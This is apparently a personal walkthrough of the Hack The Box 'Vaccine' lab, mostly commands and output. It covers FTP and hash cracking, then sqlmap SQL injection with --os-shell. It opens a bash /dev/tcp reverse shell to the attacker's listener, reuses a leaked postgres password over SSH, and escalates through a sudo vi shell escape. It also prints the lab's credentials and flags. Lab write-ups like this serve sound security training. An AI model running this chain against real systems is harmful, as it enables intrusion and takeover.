
### **Starting Labs**

##### **Section 3:**
###### Vaccine:
		 --website enum--
```	    nmap -sC -sV {ip}
		

		    ftp {ip}
			anonymous/{no pass}
			get backup.zip
			quit

		
		 zip2john backup.zip > hashes

		 gzip -d rockyou.txt.gz

		 john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```
	
```
		john --show hashes
```

			note password was 741852963, it will be in the following format bellow.
			
			back.zip:{passwd}::...
			
			
```
		unzip backup.zip 
			enter password$:741852963
			
```
		unzips files:
		
		 cat index.php
					 there is a section that specifys that a password has to be                          equal to something when its md5 encrypted.
					 
				md5(passwd)==="2cb42f8734ea607eefed3b70af13bbd3"
		 
```
		 hashid 2cb42f8734ea607eefed3b70af13bbd3
		
		 echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
		
		hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```
			
			after decrypting it qwerty789 is our password.
			2cb42f8734ea607eefed3b70af13bbd3:qwerty789

		now that we have the website password we can login through webpage using             these credentials.
		
		user: admin
		password: qwerty789
		
		
		---Establishing foothold via Dashboard search ---
		search bar only useful thing.
		so we use sql map with our cookies which we got using inspect element.
		
		Get sql map and find vulnerabilities:
```
		sqlmap -u 'http://{ip}/dashboard.php?search=' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7"
```
		
		We found that the search bar is vulnerable so we add a os shell to our cmd
		
```
		sqlmap -u 'http://10.129.95.174/dashboard.php?search=' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7" --os-shell
```

		now we need to find our own  ip for the shell we are trying to use so we open a new bash terminal.
		in new terminal:
```
HOSTNAME -I

Sudo nc -lvnp 1234
```

go back to old terminal:

```
bash -c "bash -i >& /dev/tcp/{your_IP}/{port} 0>&1"
```
after establishing the shell, we enter the following:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

After looking through some directories we find user.txt file in '/var/lib/postgresql/'


			cat user.txt
		
		**>>ec9b13ca4d6229cd5cc1e09980965bf7**
		
that is our user flag which we will need to submit after we are done with the lab.

we continue digging and searching other directories, after going back a few directories we find the /var/www directory which has the website pages. 

we find a few files and after reading a few of them using ```cat ``` we find the following line in "dashboard.php"

```
try {
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
password=P@s5w0rd!");
}
```

We can see that the postgres password is listed as ``
```P@s5w0rd!```. So we can use this to login via ssh which will give us a more stable shell as opposed to using os-shell and spawning our own bash terminal. 

we can now connect via SSH 

```
ssh postgres@{ip}
```

and then enter the password ``` P@s5w0rd!``` .

after running ```sudo -l``` to get the permissions we have this is the output:

```
postgres@vaccine:/$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

the following line at the end of the output 
```  
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
signifies we have sudo access to run  
```
/bin/vi 
```
on 
```
/etc/postgresql/11/main/pg_hba.conf
```

so to check the file we run the command
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

after opening the vi file we can type in the following command to set the shell and then run it:
```
:Set shell=/bin/sh

:shell
```
since we ran the shell with sudo privileges we now have root access, we can verify this by typing ```
```
whoami
```
we should get "root" in the response.

![[VqKjp5f.png]]

after verifying we are root, we can look at the directory we are in and try to navigate the the root folder we saw earlier
```
cd root

ls 

cat root.txt
```
after reading the root file we get the root flag:
```
dd6e058e814260bc70e9bbdef2715849
```


Now we have the user and root flag:
User: ec9b13ca4d6229cd5cc1e09980965bf7
Root: dd6e058e814260bc70e9bbdef2715849

-------

###### Unified:

---website enum---
